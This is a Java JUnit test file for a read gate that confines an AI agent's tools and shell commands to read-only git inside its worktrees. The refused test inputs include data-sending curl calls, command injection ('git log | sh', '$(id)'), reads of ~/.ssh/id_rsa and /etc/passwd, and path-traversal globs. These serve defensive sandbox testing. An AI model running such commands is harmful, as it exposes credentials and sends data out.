package dev.jagt.orchestrator.surface.agent;

import dev.jagt.orchestrator.service.ReadScopes.ReadScope;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;

class ReadGateTest {

    @TempDir
    Path worktree;

    @ParameterizedTest
    @ValueSource(strings = {"mcp__acme__get_issue", "mcp__whole__add_comment", "StructuredOutput"})
    void letsThroughEveryToolTheReadWasGiven(String tool) {
        ReadScope scope = new ReadScope(List.of(), List.of("mcp__acme__get*", "mcp__whole__add_comment",
                "StructuredOutput"), false);

        assertThat(ReadGate.refusal(scope, tool, Map.of(), "/tmp")).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {"mcp__plugin_acme_browser__new_page", "mcp__acme__save_note", "mcp__whole__save_note",
            "WebFetch", "Write"})
    void refusesAToolTheReadWasNotGivenWhateverTheHumanAllowsElsewhere(String tool) {
        ReadScope scope = new ReadScope(List.of(), List.of("mcp__acme__get*", "mcp__whole"), false);

        assertThat(ReadGate.refusal(scope, tool, Map.of(), "/tmp")).get().asString().contains("refuses " + tool);
    }

    @ParameterizedTest
    @ValueSource(strings = {"git log --no-ext-diff --no-textconv --oneline -5",
            "git diff --no-ext-diff --no-textconv main..HEAD", "git show --no-ext-diff --no-textconv HEAD:src/a.txt",
            "git diff --no-ext-diff --no-textconv --output-indicator-new=+ -U3 HEAD",
            "git log --no-ext-diff --no-textconv --grep=ABC-42 --format=%h:%s", "git status -uno",
            "git -C . log --no-ext-diff --no-textconv", "git blame --no-ext-diff --no-textconv -L10,20 a.txt"})
    void runsAReadOnlyGitCommandInsideTheWorktrees(String command) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), true);

        assertThat(ReadGate.refusal(scope, "Bash", Map.of("command", command), worktree.toString())).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {"awk 'BEGIN{system(\"id\")}'", "tmux send-keys -t master 'deploy' Enter",
            "curl -s http://example.test/?d=x", "git push origin main", "git log; curl http://example.test",
            "git log | sh", "git log $(id)", "git diff --no-index /dev/null ~/.ssh/id_rsa", "git log --output=/tmp/x",
            "git log --ou=/tmp/x", "git blame --contents /etc/passwd a.txt", "git diff /etc/passwd /dev/null",
            "git -C /etc log", "git diff ../../other", "GIT_DIR=/tmp git log", "git -c core.pager=id log"})
    void refusesEveryShellLineButAReadOnlyGitCommandInsideTheWorktrees(String command) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), true);

        assertThat(ReadGate.refusal(scope, "Bash", Map.of("command", command), worktree.toString())).isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {"git blame --no-ext-diff --no-textconv --ignore-revs-file=/etc/passwd a.txt",
            "git diff --no-ext-diff --no-textconv -O/etc/passwd", "git ls-files --exclude-from=/etc/passwd",
            "git ls-files -X/etc/passwd", "git diff --no-ext-diff --no-textconv --textconv", "git diff HEAD",
            "git show --no-ext-diff HEAD"})
    void refusesAGitOptionOrPathItDoesNotKnowToStayInsideTheWorktrees(String command) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), true);

        assertThat(ReadGate.refusal(scope, "Bash", Map.of("command", command), worktree.toString())).isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {"git diff --no-ext-diff --no-textconv {/etc/passwd,README}",
            "git diff --no-ext-diff --no-textconv .{.,}/x README",
            "git diff --no-ext-diff --no-textconv {~/.ssh/known_hosts,README}",
            "git log --no-ext-diff --no-textconv --grep 'ABC-42 fix'", "git diff --no-ext-diff --no-textconv HEAD~1",
            "git diff --no-ext-diff --no-textconv *", "git diff --no-ext-diff --no-textconv =ls",
            "git log --no-ext-diff --no-textconv --format=%GS", "git log  --no-ext-diff --no-textconv"})
    void refusesALineTheShellWouldNotPassOnLiterally(String command) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), true);

        assertThat(ReadGate.refusal(scope, "Bash", Map.of("command", command), worktree.toString())).isPresent();
    }

    @Test
    void refusesGitToAReadThatWasGivenNoShell() {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Bash", Map.of("command", "git log"), worktree.toString())).isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {"src/a.txt", "./README.md"})
    void readsAFileInsideTheWorktrees(String path) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Read", Map.of("file_path", path), worktree.toString())).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {"/etc/passwd", "~/.ssh/id_rsa", "../.jagt/master-token"})
    void refusesAFileOutsideTheWorktrees(String path) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Read", Map.of("file_path", path), worktree.toString())).get()
                .asString().contains("inside the round's worktrees");
    }

    @Test
    void refusesALinkInsideTheWorktreesThatLeadsOutOfThem() throws Exception {
        Files.createSymbolicLink(worktree.resolve("keys"), Path.of("/etc"));
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Read", Map.of("file_path", "keys/passwd"), worktree.toString()))
                .isPresent();
    }

    @Test
    void refusesASearchNamingNoPathFromOutsideTheWorktrees() {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Grep", Map.of("pattern", "token"), "/etc")).isPresent();
    }

    @Test
    void searchesTheWorktreeItRunsInWhenNoPathIsNamed() {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Grep", Map.of("pattern", "\\.\\./x"), worktree.toString())).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {"/etc/*", "../**/*", "~/.ssh/*", "{../,}secret.txt", "{..,x}/secret.txt",
            ".{.,}/secret.txt", "src/{a,b}.txt"})
    void refusesAGlobPatternThatCouldReachOutOfTheWorktrees(String pattern) {
        ReadScope scope = new ReadScope(List.of(worktree), List.of(), false);

        assertThat(ReadGate.refusal(scope, "Glob", Map.of("pattern", pattern), worktree.toString())).isPresent();
    }
}
